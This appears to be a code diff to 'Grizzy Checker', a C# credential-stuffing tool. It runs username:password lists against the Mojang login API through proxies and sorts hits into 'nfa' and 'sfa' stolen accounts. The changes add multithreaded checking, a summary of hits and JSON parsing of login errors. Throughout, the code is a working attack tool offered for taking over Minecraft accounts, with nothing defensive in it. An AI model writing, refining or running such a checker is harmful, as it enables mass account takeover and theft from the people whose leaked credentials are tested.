@@ -4,6 +4,7 @@ using System.Diagnostics;
 using System.IO;
 using System.Text;
 using System.Threading;
+using Newtonsoft.Json;
 using xNet;
 using HttpRequest = xNet.HttpRequest;
 using HttpResponse = xNet.HttpResponse;
@@ -72,7 +73,7 @@ namespace MinecraftSharp
                 if (Data.AccountsList.Count > 0 && Data.ProxyList.Count > 0)
                 {
                     mywatch.Start();
-                    _threadPoll.addToQueue(Checker);
+                    Checker();
                 }
                 else
                 {
@@ -123,69 +124,74 @@ namespace MinecraftSharp
             List<MinecraftAccount> failed_accounts = new List<MinecraftAccount>();
             List<MinecraftAccount> forbidden_accounts = new List<MinecraftAccount>();
             List<MinecraftAccount> nulled_accounts = new List<MinecraftAccount>();
-
+            
+            _threadPoll.setEndHook(() =>
+            {
+                mywatch.Stop();
+                Console.WriteLine("•{0} success accounts • {1} failed accounts in {2}s", success_accounts.Count, failed_accounts.Count + forbidden_accounts.Count + nulled_accounts.Count, mywatch.ElapsedTicks/1000);
+                _threadPoll.collectGarbage();
+            });
+            
+            
             Data.AccountsList.ForEach(s =>
             {
-                var acc = s.Split(':');
+                _threadPoll.addToQueue((t) => {
+                    var acc = s.Split(':');
 
-                var username = acc[0];
-                var password = acc[1];
+                    var username = acc[0];
+                    var password = acc[1];
 
-                var account = MojangApi(username, password);
-                switch (account.minecraft_state)
-                {
-                    case State.failed:
-                        if (configuration.FailPrint)
-                        {
-                            Console.WriteLine("{0} Failed", account.account);
-                        }
+                    var account = MojangApi(username, password);
+                    switch (account.minecraft_state)
+                    {
+                        case State.failed:
+                            if (configuration.FailPrint)
+                            {
+                                Console.WriteLine("{0} Failed", account.account);
+                            }
 
-                        failed_accounts.Add(account);
-                        break;
-                    case State.forbidden:
-                        if (configuration.FailPrint)
-                        {
-                            Console.WriteLine("{0} Forbidden", account.account);
-                        }
+                            failed_accounts.Add(account);
+                            break;
+                        case State.forbidden:
+                            if (configuration.FailPrint)
+                            {
+                                Console.WriteLine("{0} Forbidden", account.account);
+                            }
 
-                        forbidden_accounts.Add(account);
-                        break;
-                    case State.nfa:
-                        if (configuration.HitsPrint)
-                        {
-                            Console.WriteLine("{0} • Minecon {1} • Optifine {2} • {3} ", account.hasMinecon,
-                                account.hasOptifine, configuration.Formats.NfaFormat, account.account);
-                        }
+                            forbidden_accounts.Add(account);
+                            break;
+                        case State.nfa:
+                            if (configuration.HitsPrint)
+                            {
+                                Console.WriteLine("{0} • Minecon {1} • Optifine {2} • {3} ", account.hasMinecon,
+                                    account.hasOptifine, configuration.Formats.NfaFormat, account.account);
+                            }
 
-                        success_accounts.Add(account);
-                        break;
-                    case State.sfa:
-                        if (configuration.HitsPrint)
-                        {
-                            Console.WriteLine("{0} • Minecon {1} • Optifine {2}  • {3} ", account.hasMinecon,
-                                account.hasOptifine, configuration.Formats.NfaFormat, account.account);
-                        }
+                            success_accounts.Add(account);
+                            break;
+                        case State.sfa:
+                            if (configuration.HitsPrint)
+                            {
+                                Console.WriteLine("{0} • Minecon {1} • Optifine {2}  • {3} ", account.hasMinecon,
+                                    account.hasOptifine, configuration.Formats.NfaFormat, account.account);
+                            }
 
-                        success_accounts.Add(account);
-                        break;
-                    case State.NULL:
-                        if (configuration.FailPrint)
-                        {
-                            Console.WriteLine("{0} Nulled", account.account);
-                        }
+                            success_accounts.Add(account);
+                            break;
+                        case State.NULL:
+                            if (configuration.FailPrint)
+                            {
+                                Console.WriteLine("{0} Nulled", account.account);
+                            }
 
-                        nulled_accounts.Add(account);
-                        break;
-                }
+                            nulled_accounts.Add(account);
+                            break;
+                    }
 
-                Thread.CurrentThread.Interrupt();
-                Console.Title = "Grizzy Checker | Hits: " + success_accounts.Count + " | Failed: " +
-                                failed_accounts.Count;
+                    t.killThread();
+                    Console.Title = "Grizzy Checker | Hits: " + success_accounts.Count + " | Failed: " + failed_accounts.Count;
+                });
             });
-            mywatch.Stop();
-            Console.WriteLine("• {0} success accounts • {1} failed accounts in {2}ms", success_accounts.Count,
-                failed_accounts.Count + forbidden_accounts.Count + nulled_accounts.Count, mywatch.ElapsedTicks);
-            _threadPoll.collectGarbage();
         }
 
         private static MinecraftAccount MojangApi(string username, string password)
@@ -254,24 +260,24 @@ namespace MinecraftSharp
                 }
                 else
                 {
-                    if (response.ToString().Contains("errorMessage"))
+                    String res = response.ToString();
+                    if (res.Length > 0 && res.StartsWith("{"))
                     {
-                        if (response.ToString().Contains("Invalid credentials. Invalid username or password."))
-                        {
-                            accountRest.minecraft_state = State.failed;
-                            return accountRest;
-                        }
-                        else
-                        {
-                            accountRest.minecraft_state = State.forbidden;
-                            return accountRest;
+                        dynamic obj = JsonConvert.DeserializeObject(res);
+                        switch (obj["errorMessage"]){
+                            case "Invalid credentials. Invalid username or password.":
+                            {
+                                accountRest.minecraft_state = State.failed;
+                                return accountRest;
+                            }
+                            default:
+                            {
+                                accountRest.minecraft_state = State.forbidden;
+                                return accountRest;
+                            }
                         }
                     }
-                    else
-                    {
-                        accountRest.minecraft_state = State.failed;
-                        return accountRest;
-                    }
+                    Console.WriteLine("Invalid Proxy");
                 }
             }
             else
